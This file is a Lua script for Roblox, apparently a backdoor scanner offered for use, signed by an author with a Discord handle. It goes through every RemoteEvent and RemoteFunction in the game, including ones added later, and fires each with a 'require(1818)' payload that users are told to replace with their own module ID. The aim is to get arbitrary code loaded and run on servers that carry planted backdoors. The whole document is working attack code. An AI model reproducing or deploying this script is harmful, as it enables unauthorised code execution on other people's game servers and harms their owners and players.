-- encode cached strings
local encodedCached = {"RemoteEvent", "RemoteFunction", "SetBlockedUserIdsRequest", "UnMutePlayerRequest", "MutePlayerRequest"}
local encodedString = table.concat(encodedCached, ",")
local myEncodedBackoor = string.split(encodedString, ",") 

-- foreach cached strings

for i, v in ipairs(encodedCached) do 
    myEncodedBackoor[i] = tostring(v)
end 

local plrGui = game:GetService("Players"):GetPlayers()[1].PlayerGui

-- scan for remotes

function scanRems(v)
    local target = tostring(v)

    workspace.DescendantAdded:Connect(function(con)
        if con:IsA("RemoteEvent") then 
             table.insert(myEncodedBackoor, con)
             con:FireServer(v)
        end 
    end) 

    game.DescendantAdded:Connect(function(con)
        if con:IsA("RemoteEvent") then 
             con:FireServer(v)
        end 
    end) 

    for i, v in ipairs(game:GetDescendants()) do 
         if v:IsA("RemoteEvent") then 
              v:FireServer(target)
         end 
    end 

    for i,v in ipairs(workspace:GetDescendants()) do 
         if v:IsA("RemoteEvent") then 
              v:FireServer(target)
         end 
    end 


    for i,v in ipairs(game.Lighting:GetDescendants()) do 
         if v:IsA("RemoteEvent") then 
              v:FireServer(v)
         end 
    end 

    for i,v in ipairs (plrGui:GetDescendants()) do 
         if v:IsA("RemoteEvent") then 
             v:FireServer(target)
         end 
    end 

    for i,v in ipairs (game:GetService("StarterGui"):GetDescendants()) do 
          if v:IsA("RemoteEvent") then 
               v:FireServer(target)
          end 
    end 

    for i,v in ipairs (game:GetService("ReplicatedStorage"):GetDescendants()) do 
          if v:IsA("RemoteEvent") then 
               table.insert(encodedCached, v:GetFullName())
               v:FireServer(target)
          end 
    end 
    game:GetService("ReplicatedStorage").ChildAdded:Connect(function(con)
        if (con) then 
            if (con:IsA'RemoteFunction') then 
                con:InvokeServer(target)
            end
        end 
    end);
end 

function scan2(target)
    do 
        workspace.DescendantAdded:Connect(function(con)
            if con:IsA("RemoteFunction") then 
                 table.insert(myEncodedBackoor, con)
                 con:InvokeServer(target)
            end 
        end) 
    
        game.DescendantAdded:Connect(function(con)
            if con:IsA("RemoteFunction") then 
                 con:InvokeServer(target)
            end 
        end) 
    
        for i, v in ipairs(game:GetDescendants()) do 
             if v:IsA("RemoteFunction") then 
                  v:InvokeServer(target)
             end 
        end 
    
        for i,v in ipairs(workspace:GetDescendants()) do 
             if v:IsA("RemoteFunction") then 
                  v:InvokeServer(target)
             end 
        end 
    
    
        for i,v in ipairs(game.Lighting:GetDescendants()) do 
             if v:IsA("RemoteFunction") then 
                  v:InvokeServer(v)
             end 
        end 
    
        for i,v in ipairs (plrGui:GetDescendants()) do 
             if v:IsA("RemoteFunction") then 
                 v:InvokeServer(target)
             end 
        end 
    
        for i,v in ipairs (game:GetService("StarterGui"):GetDescendants()) do 
              if v:IsA("RemoteFunction") then 
                   v:InvokeServer(target)
              end 
        end 
    
        for i,v in ipairs (game:GetService("ReplicatedStorage"):GetDescendants()) do 
              if v:IsA("RemoteFunction") then 
                   v:InvokeServer(target)
              end 
        end 
    end 
end 

-- scan 


-- initialize scanner
local target = "require(1818)" --// EDIT YOUR 1818 TO YOUR OWN!
scan2(target)
scanRems(target)

-- made by Alex J0nes --
-- discord: Alex J0nes#0777
